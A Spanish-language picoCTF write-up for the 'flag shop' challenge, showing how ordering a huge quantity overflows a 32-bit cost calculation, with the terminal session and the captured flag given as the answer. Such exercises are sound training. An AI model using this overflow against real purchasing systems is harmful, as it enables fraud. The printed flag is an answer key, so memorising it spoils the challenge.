#Software #Hacking #Computación #GeneralSkills
Hecho por: [[Estufa|Juana Estefanía Herrera Mendoza]]
# Definición
There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/253c4651d852ac6342752ff222cf2a83/store.c). Connect with `nc jupiter.challenges.picoctf.org 9745`.
# Hints
- Two's compliment can do some weird things when numbers get really big!
# Solución
Comenzamos descargando el archivo como es costumbre, al tenerlo nos conectaremos con [[NET CAT]]: `nc jupiter.challenges.picoctf.org 9745`. Entramos a una interfaz y seguimos los pasos para 'comprar la bandera'.
```bash
AsumomezaC-picoctf@webshell:~$ nc jupiter.challenges.picoctf.org 9745
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2400000

The final cost is: -2134967296

Your current balance after transaction: 2134968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one
1
YOUR FLAG IS: picoCTF{m0n3y_bag5_65d67a74}
Welcome to the flag exchange
We sell flags

3. Check Account Balance

4. Buy Flags

5. Exit

 Enter a menu selection
```
## Respuesta
picoCTF{m0n3y_bag5_65d67a74}